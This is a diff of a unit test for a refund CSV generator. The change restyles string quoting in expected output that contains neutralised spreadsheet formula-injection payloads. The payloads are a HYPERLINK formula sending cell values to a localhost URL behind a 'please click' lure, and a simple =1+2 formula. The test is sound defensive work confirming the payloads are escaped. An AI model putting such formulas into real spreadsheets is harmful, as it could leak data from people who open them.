@@ -139,10 +139,10 @@ class ValidTransactionsTestCase(RefundFileTestCase):
         csvdata = self._generate_refund_file(transactions=naughty_transactions)
 
         self.assertEqual(
-            ('''111111,22222222,"'=HYPERLINK(""http://127.0.0.1/?value=""&A1&A1, '''
-             '''""Error: please click for further information"")",25.68,%(ref_a)s\r\n'''
-             '''999999,33333333,'=1+2,18.72,%(ref_b)s\r\n'''
-             '''667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n''')
+            ('111111,22222222,"\'=HYPERLINK(""http://127.0.0.1/?value=""&A1&A1, '
+             '""Error: please click for further information"")",25.68,%(ref_a)s\r\n'
+             "999999,33333333,'=1+2,18.72,%(ref_b)s\r\n"
+             '667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n')
             % {'ref_a': get_base_ref() + '00001',
                'ref_b': get_base_ref() + '00002'},
             csvdata)
